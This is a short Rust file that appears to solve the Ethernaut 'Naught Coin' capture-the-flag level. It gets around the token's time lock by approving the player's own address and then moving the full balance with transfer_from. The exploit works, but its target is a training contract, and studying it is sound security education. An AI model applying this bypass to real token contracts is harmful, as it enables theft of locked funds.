use async_trait::async_trait;
use ctf::ethernaut::lvl15_naught_coin::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let coin = NaughtCoin::new(target.address, offender.to_owned());

        let balance = coin.balance_of(offender.address()).await?;

        coin.approve(offender.address(), balance).send().await?.await?;

        coin.transfer_from(offender.address(), coin.address(), balance)
            .send()
            .await?
            .await?;

        Ok(())
    }
}
